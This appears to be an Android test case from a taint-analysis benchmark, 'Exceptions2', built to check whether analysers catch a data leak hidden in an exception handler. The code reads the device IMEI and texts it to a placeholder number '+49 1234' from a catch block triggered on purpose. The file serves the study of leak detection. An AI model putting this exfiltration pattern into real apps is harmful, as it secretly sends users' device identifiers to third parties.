package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Exceptions1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description tainted data is created and sent out in an implicitly invoked
 exception handler
 * @dataflow source -> imei -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle implicit exceptions
 */
public class Exceptions2 extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_exceptions2);
        String imei = "";
        try {
            TelephonyManager telephonyManager =
              (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            imei = telephonyManager.getDeviceId();
            int[] arr = new int[(int) Math.sqrt(49)];
            if (arr[32] > 0) imei = "";
        }
        catch (RuntimeException ex) {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage("+49 1234", null, imei, null, null);
        }
    }
    
    public Exceptions2() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "1P9/ACRnUHnKDwAA");
}
